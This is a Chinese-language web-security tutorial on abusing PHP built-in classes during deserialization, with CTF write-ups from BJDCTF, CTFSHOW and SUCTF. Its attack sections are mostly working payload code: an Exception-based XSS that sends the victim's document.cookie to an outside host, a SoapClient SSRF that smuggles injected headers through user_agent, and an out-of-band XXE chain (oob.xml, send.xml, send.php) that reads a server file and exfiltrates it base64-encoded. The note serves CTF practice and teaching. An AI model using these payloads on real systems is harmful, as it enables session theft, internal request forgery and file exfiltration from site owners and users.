

# 知识点

1、WEB攻防-PHP反序列化-原生类&生成及利用条件
2、WEB攻防-PHP反序列化-Exception触发XSS
3、WEB攻防-PHP反序列化-SoapClient触发SSRF
4、WEB攻防-PHP反序列化-SimpleXMLElement触发XXE


# PHP原生类反序列化
## 原生自带类参考文章
PHP 原生类的利用小结 https://xz.aliyun.com/news/8792
浅析PHP原生类 https://www.anquanke.com/post/id/264823
PHP 原生类的利用 https://blog.csdn.net/cjdgg/article/details/115314651
## 利用条件 ：
### 1、有触发魔术方法
如echo触发输出对象可调用 `__toString `  
触发不存在方法调用`__call `
### 2、魔术方法有利用类
通过下面脚本可查看魔术方法的可利用原生类
#### 生成原生类 ：

运行此php脚本查看

```php
<? php
$classes = get_declared_classes ();
Foreach ($classes as $class) {
    $methods = get_class_methods ($class);
    Foreach ($methods as $method) {
        If (in_array ($method, array (
			'__construct',
            '__destruct',
            '__toString',
            '__wakeup',
            '__call',
            '__callStatic',
            '__get',
            '__set',
            '__isset',
            '__unset',
            '__invoke',
            '__set_state'
        ))) {
            Print $class . ':: ' . $method . "\n";
        }
    }
}
```

### 3、部分自带类拓展开启
如 SoapClient 需要php.ini内 extension开启soap

# PHP反序列化配合Web攻防
## 1 、使用 Error/Exception 类进行 XSS
```php
<? php
highlight_file (__file__);
$a = unserialize ($_GET['code']);
echo $a;
?>
```
- 输出对象可调用_**_toString**
- 无代码通过原生类 Exception
- Exception 使用查询编写利用
- 通过访问触发输出产生 XSS 漏洞
```php
<?php
$a=new Exception("<script>alert('xiaodi')</script>");
echo urlencode(serialize($a));
?>
```

### 「BJDCTF 2 nd」xss 之光
题目地址： https://buuoj.cn
> 扫描目录发现.git 泄露，通过.git 泄露工具获取源码，然后进行代码审计发现存在反序列化，没有已知类，使用echo 调用的原生类_toString,，有关XSS的题目，flag一般都在cookie里面。
```php
//源码泄露得出的代码
<?php
$a = $_GET['yds_is_so_beautiful'];
echo unserialize($a);
```

```php
<?php
$poc = new Exception("<script>window.open('http://靶机ip/?'+document.cookie);</script>");
echo urlencode(serialize($poc));
?>
```

## 2 、使用 SoapClient 类进行 SSRF
```php
<?php
$s = unserialize($_GET['ssrf']);
$s->a();//php.ini关闭extension=soap（自带类拓展关闭）
?>
```
- 输出对象可调用**__call**
- 无代码通过原生类 SoapClient
- SoapClient 使用查询编写利用
- 通过访问触发服务器 SSRF 漏洞
- php,ini extension开启soap
```php
<?php
$a = new SoapClient(null,array('location'=>'http://192.168.1.4:2222/aaa', 'uri'=>'http://192.168.1.4:2222'));
$b = serialize($a);
echo $b;
?>
```

### CTFSHOW-259
- 不存在的方法触发**__call**
- 无代码通过原生类 SoapClient
- SoapClient 使用查询编写利用
- 通过访问本地 Flag. Php 获取 Flag
```php
<?php
$ua="aaa\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";
$client=new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1/flag.php','user_agent'=>$ua));
echo urlencode(serialize($client));
?>
```

## 3 、使用 SimpleXMLElement 类进行 xxe
```php
<?php
$sxe=new SimpleXMLElement('http://192.168.1.4:82/76/oob.xml',2,true);
$a = serialize($sxe);
echo $a;
?>
```
- 不存在的方法触发__construct
- 无代码通过原生类 SimpleXMLElement
- SimpleXMLElement 使用查询编写利用

### **「SUCTF 2018」** Homework
题目地址： https://buuoj.cn
> 利用点：SimpleXMLElement(url,2,true)

**oob.xml:**
```XML
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % remote SYSTEM "http://server_ip/send.xml">
%remote;
%all;
%send;
]>
```

**send.xml:**
```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=x.php">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://server_ip/send.php?file=%file;'>">
```

**send.php:**
```PHP
<?php 
file_put_contents("result.txt", $_GET['file']) ;
?>
```
服务器本地放以上三个文件
**Poc:**
```http
/show.php?module=SimpleXMLElement&args[]=http://120.27.152.29/oob.xml&args[]=2&args[]=true
```